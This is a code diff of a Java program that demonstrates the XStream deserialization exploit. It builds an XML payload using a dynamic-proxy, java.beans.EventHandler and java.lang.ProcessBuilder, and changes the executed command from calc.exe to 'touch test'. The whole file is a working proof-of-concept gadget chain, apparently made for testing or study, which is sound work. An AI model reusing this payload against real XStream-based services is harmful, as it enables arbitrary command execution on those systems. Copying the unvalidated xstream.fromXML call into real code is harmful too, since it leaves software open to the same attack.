@@ -4,8 +4,8 @@ import java.io.IOException;
 import com.thoughtworks.xstream.XStream;
 import com.thoughtworks.xstream.io.xml.DomDriver;
 
-import contact.Contact;
-import contact.ContactImpl;
+import lib.Contact;
+import lib.ContactImpl;
 
 public class Main {
   public static void main(String[] args) throws IOException {
@@ -14,21 +14,22 @@ public class Main {
     String contactXml = xstream.toXML(contact);
     ContactImpl contactFromXml = (ContactImpl) xstream.fromXML(contactXml);
 
-    String xml = "<contact.Contact>\n"
-    + "<dynamic-proxy>\n" 
-      + "<interface>contact.Contact</interface>"
+    // String contactXmlNew = xstream.toXML(new ContactImpl());
+    // System.out.println(contactXmlNew);
+
+    String xml = "<lib.ContactImpl>\n"
+    + "<dynamic-proxy>\n"
+      + "<interface>lib.Contact</interface>"
         + "<handler class='java.beans.EventHandler'>"
           + "<target class='java.lang.ProcessBuilder'>"
-            + "<command><string>calc.exe</string></command>" 
+            + "<command><string>touch test</string></command>"
           + "</target>"
-          + "<action>start</action>" 
-        + "</handler>" 
-      + "</dynamic-proxy>" 
-    + "</contact.Contact>";
+          + "<action>start</action>"
+        + "</handler>"
+      + "</dynamic-proxy>"
+    + "</lib.ContactImpl>";
 
-    String contactXmlNew = xstream.toXML(new ContactImpl());
-    System.out.println(contactXmlNew);
     Contact c = (Contact)xstream.fromXML(xml);
-    // System.out.println(c.getFullname());
+    System.out.println(c.getFullname());
   }
 }
